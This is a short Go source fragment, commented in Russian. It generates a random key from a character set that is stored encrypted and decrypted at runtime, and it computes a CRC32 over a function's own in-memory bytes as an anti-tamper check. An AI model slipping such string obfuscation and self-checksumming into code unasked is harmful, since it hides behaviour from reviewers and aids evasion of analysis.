func genKey() string {
	var letters = []rune(Cipher.Decrypt("\xdc\xd0\x5e\xd8\x45\x84\xeb\xf0\xd4\xd8\x56\xd0\x4d\x8c\xe3\xe8\xcc\xc0\x4e\xc8\x55\x94\xfb\xe0\xc4\xc8\x7c\xfe\x63\xa6\xc9\xde\xfa\xfa\x74\xf6\x6b\xae\xc1\xd6\xf2\xe2\x6c\xee\x73\xb6\xd9\xce\xea\xea\x64\xe6\x11\xd0\xbf\xac\x88\x84\x0a\x84\x19\xd2\xa3\xb9\xfd\x91\x19\xe2\x06\xc8"))
	b := make([]rune, 10)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return Cipher.Decrypt("\xf6\xf7\x64\x98") + string(b) + Cipher.Decrypt("\x99")
}

func getFunctionBytes(f interface{}, startAddr, funcLength uintptr) []byte {

	// Создаем слайс для хранения байтов функции
	funcBytes := make([]byte, funcLength)

	// Чтение байтов из диапазона функции
	for i := uintptr(0); i < funcLength; i++ {
		funcBytes[i] = *((*byte)(unsafe.Pointer(uintptr(startAddr) + i)))
	}

	return funcBytes
}

func GetFunctionCRC(f interface{}, len uintptr) uint32 {
	// Получаем байты функции в указанном диапазоне
	funcValue := reflect.ValueOf(f)

	startAddr := funcValue.Pointer()

	funcBytes := getFunctionBytes(f, startAddr, len)
	// Вычисляем CRC для этого участка памяти
	return crc32.ChecksumIEEE(funcBytes)
}

